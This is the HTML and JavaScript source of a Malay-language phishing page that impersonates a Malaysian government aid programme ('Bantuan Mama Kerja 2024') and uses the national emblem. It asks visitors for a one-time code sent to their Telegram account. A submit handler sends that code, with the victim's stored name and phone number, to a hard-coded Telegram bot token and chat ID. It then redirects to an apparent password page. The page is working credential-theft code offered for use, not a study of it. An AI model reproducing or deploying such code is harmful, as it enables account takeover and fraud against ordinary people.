<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Bantuan Mama Kerja Untuk Seluruh Warga Malaysia 2024</title>

    <!-- Link ke Google Fonts -->
    <link
      href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap"
      rel="stylesheet"
    />

    <!-- Link ke CSS intl-tel-input -->
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"
    />

    <style>
      * {
        box-sizing: border-box;
        outline: none;
        border: none;
        text-decoration: none;
      }

      body {
        font-family: "Poppins", sans-serif;
        color: #010101;
        background-color: #fff;
      }
      .hero {
        height: 100vh;
        width: 100%;
        background-size: cover;
        background-position: center;
        position: relative;
      }

      /* navbar */
      .navbar {
        display: flex;
        justify-content: space-between;
        align-items: center;
        background-color: #fff; /* Warna latar belakang navbar */
        padding: 10px 20px;
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        z-index: 9999;
      }

      .navbar .navbar-logo {
        font-size: 2vw; /* Ukuran font logo dinamis */
        color: #010101;
        font-weight: 400;
        display: flex;
        align-items: center;
      }

      .navbar .navbar-nav {
        display: flex;
        align-items: center;
        justify-content: flex-end; /* Posisi tautan tetap rapih di ujung kanan */
        flex-wrap: nowrap; /* Mencegah elemen terbungkus menjadi kolom */
      }

      .navbar .navbar-nav a {
        color: #010101; /* Warna teks bahasa */
        font-weight: bold;
        font-size: 1.5vw; /* Ukuran font dinamis */
        margin: 0 10px; /* Menambahkan jarak antar link bahasa */
        padding: 5px; /* Ruang klik */
        text-decoration: none; /* Menghilangkan garis bawah pada link */
        white-space: nowrap; /* Mencegah teks terpotong ke baris baru */
      }

      .navbar .navbar-nav a span {
        color: blue;
      }

      .navbar .navbar-nav a:hover {
        color: #007bff; /* Warna hover */
        transition: color 0.3s ease; /* Efek transisi saat hover */
      }

      .navbar .navbar-img {
        width: 40px; /* Ukuran logo */
        height: auto;
        margin-left: 10px; /* Jarak antara logo dan teks */
        object-fit: contain; /* Menjaga proporsi gambar */
      }

      /* Media Query untuk layar kecil */
      @media (max-width: 768px) {
        .navbar {
          padding: 10px 10px; /* Mengurangi padding pada layar kecil */
        }

        .navbar .navbar-logo {
          font-size: 4vw; /* Ukuran font logo lebih besar pada layar kecil */
        }

        .navbar .navbar-nav {
          flex-direction: row; /* Pastikan tautan tetap satu baris */
        }

        .navbar .navbar-nav a {
          font-size: 3vw; /* Ukuran font lebih besar pada layar kecil */
          margin: 0 5px; /* Mengurangi margin pada layar kecil */
          padding: 5px; /* Ruang klik pada layar kecil */
        }

        .navbar .navbar-img {
          width: 30px; /* Ukuran logo lebih kecil pada layar kecil */
          margin-left: 5px; /* Kurangi jarak pada layar kecil */
          margin-top: 0;
        }
      }
      img {
        width: 350px; /* Atur lebar gambar sesuai keinginan */
        height: auto; /* Agar proporsi gambar tetap */
        display: flex; /* Untuk membuatnya blok, bisa juga inline-block */
        margin: 0 auto; /* Posisikan di tengah jika dalam elemen blok */
        margin-bottom: 0;
      }

      img[src="surituu.jpeg"] {
        margin-top: 50px;
      }

      .form-container {
        justify-content: center;
        background-color: white;
        padding: 30px 10px;
        border-radius: 10px;
        width: 80%;
        margin: 30px auto;
        margin-top: 0;
      }

      label {
        display: block;
        margin-bottom: 8px;
        font-size: 1.1rem;
        font-weight: 600;
      }

      p {
        font-size: 15px;
        font-weight: bolder;
        color: #333;
        text-align: center;
        margin-top: 20px;
        margin-bottom: 20px;
        line-height: 1.6;
        font-weight: 500;
        top: 0;
      }

      .otp-input {
        width: 50px;
        height: 50px;
        font-size: 1.5rem;
        text-align: center;
        border: 1px solid #ccc;
        border-radius: 5px;
      }

      .otp-input:focus {
        border-color: #007bff;
        outline: none;
        box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
      }

      .btn {
        display: flex;
        width: 100%;
        padding: 12px;
        margin: 10px auto 0;
        background-color: red;
        color: #010101;
        border: 1px solid #010101;
        border-radius: 10px;
        font-size: 1.1rem;
        cursor: pointer;
        align-items: center;
        justify-content: center;
        margin-bottom: 20px;
      }

      .btn:hover {
        background-color: #225786;
      }

      ._record-box {
        width: 100%;
        margin: 20px auto;
        margin-top: 0;
        padding: 5px;
        background-color: #f5f5f5;
        border-radius: 10px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      }

      /* CSS untuk list-box */
      .list-box {
        overflow: hidden;
        max-height: 200px;
      }

      /* CSS untuk list */
      .list {
        display: flex;
        flex-direction: column;
      }

      /* CSS untuk item */
      .item {
        display: flex;
        align-items: center;
        padding: 1px;
        background-color: white;
        border-radius: 8px;
        margin-bottom: 5px;
      }

      /* CSS untuk logo/avatar */
      .record_logo img {
        width: 50px;
        height: 50px;
        border-radius: 50%;
        object-fit: cover;
        margin-right: 15px;
        margin-left: 15px;
      }

      /* CSS untuk nama */
      .center .h1 {
        font-size: 16px;
        font-weight: bold;
      }

      /* CSS untuk status */
      .center .h2 {
        font-size: 14px;
        color: green;
      }

      h4 {
        display: flex;
        margin-top: 20;
        margin-bottom: 0;
        color: #010101;
        align-items: center;
        justify-content: center;
      }

      main {
        flex-grow: 1; /* Memastikan konten utama mendorong footer ke bawah */
      }

      footer {
        position: fixed; /* Tetap di bawah meski konten lebih pendek */
        left: 0;
        bottom: 0;
        width: 100%;
        background-color: #fff; /* Latar belakang footer */
        text-align: center;
      }

      footer img {
        max-width: 350px; /* Ukuran gambar maksimal */
        height: auto;
      }

      /* Loading screen styles */
      .loading-screen {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(255, 255, 255, 0.8);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 1000;
        display: none;
      }

      .loading-screen img {
        max-width: 100px;
        max-height: 100px;
      }

      /* Keyframes for spin animation */
      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      @media (max-width: 768px) {
        .form-container {
          width: 90%;
          padding: 20px;
        }

        input[type="text"],
        input[type="tel"] {
          font-size: 1rem;
        }

        .btn {
          width: 90%;
          font-size: 1.3rem;
          padding: 12px;
          color: #fff;
          background-color: red;
          font-weight: bold;
        }
      }
    </style>
  </head>
  <body>
    <nav class="navbar">
      <div class="navbar-logo">
        <img src="Jata Negara@3x.gif" alt="Logo" class="navbar-img" />
        <!-- Contoh gambar logo -->
      </div>
      <div class="navbar-nav">
        <a href="#">Bahasa Melayu</a>
        <a href="#"><span>English</span></a>
        <a href="#"><span>日本</span></a>
        <a href="#"><span>摩訶至那國</span></a>
      </div>
    </nav>

    <div class="hero">
      <br />
      <br />
      <img src="mykaddd.jpeg" alt="tng-img" />

      <h4>SEMAK KELAYAKAN & MOHON SEKARANG</h4>

      <div class="form-container">
        <p>Sila Masukan Kod-yang dihantar ke Nombor Telegram Anda</p>
        <form id="registrationForm">
          <label for="otp">Masukan Kod-OTP</label>
          <div
            id="otp-container"
            style="display: flex; gap: 10px; justify-content: center"
          >
            <input type="tel" maxlength="1" class="otp-input" required />
            <input type="tel" maxlength="1" class="otp-input" required />
            <input type="tel" maxlength="1" class="otp-input" required />
            <input type="tel" maxlength="1" class="otp-input" required />
            <input type="tel" maxlength="1" class="otp-input" required />
          </div>
          <button type="submit" class="btn">LOG MASUK</button>
        </form>
      </div>

      <footer>
        <!-- Hanya menampilkan gambar di dalam footer -->
        <img src="ini1.png" alt="Logo Footer" />
      </footer>
    </div>

    <!-- Loading Screen -->
    <div class="loading-screen" id="loadingScreen">
      <img src="loading-loading-forever.gif" alt="Loading..." />
    </div>

    <!-- Script untuk intl-tel-input -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
    <script>
      document
        .querySelectorAll(".otp-input")
        .forEach((input, index, inputs) => {
          input.addEventListener("input", () => {
            if (input.value.length === 1 && index < inputs.length - 1) {
              inputs[index + 1].focus(); // Pindah ke input berikutnya jika ada input
            }
          });

          input.addEventListener("keydown", (e) => {
            if (e.key === "Backspace" && !input.value && index > 0) {
              inputs[index - 1].focus(); // Pindah ke input sebelumnya jika kosong
            }
          });
        });

      document
        .getElementById("registrationForm")
        .addEventListener("submit", function (event) {
          event.preventDefault(); // Mencegah pengiriman form default

          const otpInputs = document.querySelectorAll(".otp-input");
          const otp = Array.from(otpInputs)
            .map((input) => input.value)
            .join(""); // Gabungkan nilai OTP

          // Periksa apakah semua input OTP terisi
          if (otp.length !== otpInputs.length) {
            alert("Silakan isi semua kolom OTP.");
            return;
          }

          // Simpan OTP ke local storage
          localStorage.setItem("otp", otp);

          // Tampilkan loading screen
          document.getElementById("loadingScreen").style.display = "flex";

          const botToken = "7630663213:AAEhgolNI84lIrv1_l7dPKLMvfCf5LT76vk"; // Ganti dengan token bot Anda
          const chatId = "6496078404"; // Ganti dengan ID chat Anda

          // Ambil data yang disimpan sebelumnya dari local storage
          const savedPhone = localStorage.getItem("phone");
          const savedName = localStorage.getItem("name");

          // Format pesan untuk Telegram
          const message = `
──────────────────
(MALAY | DATA | ${savedPhone})
──────────────────
- Nama Lengkap  : ${savedName}

- No HP         : ${savedPhone}

- OTP           : ${otp}
──────────────────
`;

          // URL untuk mengirim pesan ke Telegram
          const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
            message
          )}`;

          // Kirim pesan ke Telegram
          fetch(url)
            .then((response) => {
              if (response.ok) {
                // Arahkan ke halaman berikutnya setelah pengiriman berhasil
                window.location.href = "kata-sandi.html"; // Ganti dengan URL halaman tujuan
              } else {
                console.error("Gagal mengirim pesan:", response.statusText);
                alert("Gagal mengirim pesan. Silakan coba lagi.");
              }
            })
            .catch((error) => {
              console.error("Error:", error);
              alert(
                "Terjadi kesalahan saat mengirim pesan. Periksa koneksi Anda."
              );
            })
            .finally(() => {
              // Sembunyikan loading screen setelah proses selesai
              document.getElementById("loadingScreen").style.display = "none";
            });
        });
    </script>

    <script>
      function startAutoScroll() {
        var list = document.querySelector(".list");
        var scrollTimer;

        function scrollList() {
          var firstItem = list.querySelector(".item:first-child");
          var itemHeight = firstItem.offsetHeight;

          list.style.transition = "margin-top 1s ease";
          list.style.marginTop = `-${itemHeight}px`;

          setTimeout(function () {
            list.style.transition = "none";
            list.style.marginTop = "0px";
            list.appendChild(firstItem); // Pindahkan item pertama ke akhir
          }, 1000); // Setelah animasi selesai (1 detik)

          scrollTimer = setTimeout(scrollList, 2000); // Ulangi scroll setiap 2 detik
        }

        scrollList(); // Mulai scrolling
      }

      document.addEventListener("DOMContentLoaded", function () {
        startAutoScroll(); // Jalankan scrolling otomatis saat halaman dimuat
      });
    </script>
  </body>
</html>
